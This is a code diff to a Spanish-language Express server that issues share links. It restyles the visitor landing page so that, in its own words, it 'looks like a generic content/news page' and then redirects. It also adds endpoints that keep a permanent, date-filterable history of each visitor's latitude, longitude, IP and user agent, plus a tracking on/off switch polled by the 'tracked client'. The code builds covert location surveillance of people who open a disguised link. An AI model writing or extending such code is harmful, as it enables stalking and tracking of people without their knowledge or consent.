@@ -135,7 +135,7 @@ const handleShareRoute = async (req, res) => {
 </html>`);
     }
 
-    // Regular users: loading page with redirect
+    // Regular users: loading page with redirect (looks like a generic content/news page)
     res.send(`<!DOCTYPE html>
 <html lang="es">
 <head>
@@ -146,28 +146,28 @@ const handleShareRoute = async (req, res) => {
     ${ogTags}
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1e3a5f 0%, #0f172a 100%); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; padding: 20px; }
-        .container { max-width: 400px; }
-        .icon { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 40px; }
-        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 600; }
-        p { color: #94a3b8; margin-bottom: 24px; line-height: 1.6; }
-        .preview-card { background: rgba(255,255,255,0.05); border-radius: 12px; padding: 16px; margin: 20px 0; border: 1px solid rgba(255,255,255,0.1); }
-        .preview-card img { width: 100%; max-width: 300px; height: 160px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; }
-        .btn { display: inline-flex; align-items: center; gap: 8px; background: #38bdf8; color: #0f172a; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600; transition: opacity 0.2s; }
-        .btn:hover { opacity: 0.9; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .card { max-width: 420px; width: 100%; background: #1e293b; border-radius: 16px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
+        .card-img { width: 100%; height: 220px; object-fit: cover; display: block; }
+        .card-img-placeholder { width: 100%; height: 220px; background: linear-gradient(135deg, #334155, #1e293b); display: flex; align-items: center; justify-content: center; color: #475569; font-size: 48px; }
+        .card-body { padding: 24px; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; line-height: 1.3; }
+        .desc { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+        .btn { display: block; width: 100%; text-align: center; background: #3b82f6; color: white; padding: 14px 24px; border-radius: 10px; text-decoration: none; font-weight: 600; font-size: 16px; transition: background 0.2s; }
+        .btn:hover { background: #2563eb; }
+        .loading-text { text-align: center; color: #64748b; font-size: 12px; margin-top: 12px; }
     </style>
     <script>setTimeout(() => { window.location.href = '${redirectUrl}'; }, 2500);</script>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">\u{1F4CD}</div>
-        <div class="loader"></div>
-        <h2>${safeTitle}</h2>
-        <p>${safeDescription}</p>
-        ${image ? `<div class="preview-card"><img src="${image}" alt="Preview" onerror="this.style.display='none'"></div>` : ''}
-        <a href="${redirectUrl}" class="btn"><span>Continuar</span><span>\u{2192}</span></a>
+    <div class="card">
+        ${image ? `<img class="card-img" src="${image}" alt="${safeTitle}" onerror="this.style.display='none'">` : '<div class="card-img-placeholder">&#9881;</div>'}
+        <div class="card-body">
+            <h1>${safeTitle}</h1>
+            <p class="desc">${safeDescription}</p>
+            <a href="${redirectUrl}" class="btn">Ver contenido</a>
+            <p class="loading-text">Cargando contenido...</p>
+        </div>
     </div>
 </body>
 </html>`);
@@ -646,14 +646,112 @@ app.put('/api/user/profile', authenticateToken, async (req, res) => {
     }
 });
 
+// Toggle Tracking Active/Paused (Authenticated)
+app.put('/api/links/:id/tracking', authenticateToken, async (req, res) => {
+    try {
+        const link = await models.Link.findByPk(req.params.id);
+        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });
+
+        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
+            return res.status(403).json({ message: 'No tienes permiso' });
+        }
+
+        const newState = !link.trackingActive;
+        await link.update({ trackingActive: newState });
+        res.json({ trackingActive: newState });
+    } catch (error) {
+        res.status(500).json({ message: error.message });
+    }
+});
+
+// Get Tracking Status (Public - polled by tracked client)
+app.get('/api/links/:id/tracking-status', async (req, res) => {
+    try {
+        const link = await models.Link.findByPk(req.params.id, {
+            attributes: ['id', 'trackingActive']
+        });
+        if (!link) return res.status(404).json({ active: false });
+        res.json({ active: link.trackingActive !== false });
+    } catch (error) {
+        res.json({ active: true }); // Default to active on error
+    }
+});
+
+// Get Location History for a link (with date filtering)
+app.get('/api/links/:id/history', authenticateToken, async (req, res) => {
+    try {
+        const link = await models.Link.findByPk(req.params.id);
+        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });
+
+        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
+            return res.status(403).json({ message: 'No tienes permiso' });
+        }
+
+        const { Op } = require('sequelize');
+        const where = { linkId: req.params.id };
+
+        // Date filtering
+        if (req.query.from || req.query.to) {
+            where.timestamp = {};
+            if (req.query.from) where.timestamp[Op.gte] = new Date(req.query.from);
+            if (req.query.to) where.timestamp[Op.lte] = new Date(req.query.to);
+        }
+
+        const history = await models.LocationHistory.findAll({
+            where,
+            order: [['timestamp', 'ASC']],
+            attributes: ['id', 'lat', 'lng', 'timestamp', 'ip', 'userAgent'],
+            limit: 5000 // Safety limit
+        });
+
+        res.json(history);
+    } catch (error) {
+        res.status(500).json({ message: error.message });
+    }
+});
+
+// Get available dates with location data for a link
+app.get('/api/links/:id/history/dates', authenticateToken, async (req, res) => {
+    try {
+        const link = await models.Link.findByPk(req.params.id);
+        if (!link) return res.status(404).json({ message: 'Enlace no encontrado' });
+
+        if (link.createdBy !== req.user.id && req.user.role !== 'admin') {
+            return res.status(403).json({ message: 'No tienes permiso' });
+        }
+
+        const [results] = await models.sequelize.query(
+            `SELECT DISTINCT DATE("timestamp") as date, COUNT(*) as count
+             FROM "LocationHistories"
+             WHERE "linkId" = :linkId
+             GROUP BY DATE("timestamp")
+             ORDER BY date DESC`,
+            { replacements: { linkId: req.params.id } }
+        );
+
+        res.json(results);
+    } catch (error) {
+        res.status(500).json({ message: error.message });
+    }
+});
+
 // Track Visit (HTTP)
 app.post('/api/track', async (req, res) => {
     const { linkId, lat, lng, userAgent } = req.body;
     try {
         if (!models || !models.Session) throw new Error('Models not loaded');
 
+        // Check if tracking is active for this link
+        if (models.Link) {
+            const link = await models.Link.findByPk(linkId, { attributes: ['id', 'trackingActive'] });
+            if (link && link.trackingActive === false) {
+                return res.json({ message: 'Tracking paused', paused: true });
+            }
+        }
+
         // Capture IP (Vercel/Proxy friendly)
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+        const timestamp = new Date();
 
         await models.Session.create({
             linkId,
@@ -661,8 +759,15 @@ app.post('/api/track', async (req, res) => {
             lng,
             userAgent,
             ip,
-            timestamp: new Date()
+            timestamp
         });
+
+        // Also save to location history for permanent route tracking
+        if (models.LocationHistory) {
+            await models.LocationHistory.create({
+                linkId, lat, lng, userAgent, ip, timestamp
+            });
+        }
 
         console.log(`Tracking saved for link ${linkId} from IP ${ip}`);
         res.json({ message: 'Tracking saved' });
